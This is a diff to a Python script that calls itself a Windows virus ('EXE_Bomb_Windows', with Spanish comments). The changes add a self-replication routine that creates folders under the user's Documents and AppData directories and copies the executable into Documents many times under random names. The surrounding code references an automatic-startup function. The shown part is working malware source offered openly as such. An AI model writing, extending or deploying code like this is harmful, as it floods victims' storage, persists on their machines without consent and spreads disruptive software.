@@ -7,8 +7,8 @@ from getpass import getuser
 from multiprocessing import Process
 import threading
 import shutil
-      
-
+import string
+import random
           
 def addStartup():  # function =  Iniciar automaticamente
     path = r"C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\EXE_Bomb_Windows.exe"        # Path del Software completo
@@ -53,7 +53,13 @@ def CreateFileMain():   #
             return False
         pass
 def AutoCopy():
+    def random_char(y):
+           return ''.join(random.choice(string.ascii_letters) for x in range(y))
+    nameKey     = "EXE_Bomb_Windows" # Nombre del virus
     user        = str(getuser())
+    path        = "C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\"+nameKey+".exe"   # Segunda iniciada, esto debe existir
+    
+    
     documentos  = 'C:\\Users\\'+user+'\\Documents'
     music       = 'C:\\Users\\'+user+'\\Music'
     video       = 'C:\\Users\\'+user+'\\Videos'
@@ -62,6 +68,9 @@ def AutoCopy():
     roaming     = 'C:\\Users\\'+user+'\\AppData\\Roaming\\VirusBomb'
     locallow    = 'C:\\Users\\'+user+'\\AppData\\LocalLow\\VirusBomb'
     local       = 'C:\\Users\\'+user+'\\AppData\\Local\\VirusBomb'
+    
+
+    
     def CreateFolder():
         try:  # Intenta crear la dirección 
             os.makedirs(documentos)
@@ -95,13 +104,14 @@ def AutoCopy():
             os.makedirs(local)
         except:
             pass
-    
-        
-        
-        
-    
-
-
+    def Copy():
+        shutil.copy(path, documentos+"\\"+random_char(32)+".exe")
+        print("se copio exitosamente al escritorio")
+    #inicia
+    CreateFolder()  
+    for x in range(20):    #720
+        print("virus replicado...")
+        Copy()
 if __name__ == '__main__':
     if (CreateFileMain()):  # Se ejecuta en el primer inicio
         nameKey = "EXE_Bomb_Windows.exe"
@@ -126,6 +136,8 @@ if __name__ == '__main__':
         
         #block.start()
         #autocopy.start()         
+        AutoCopy()
+        
         
         
         
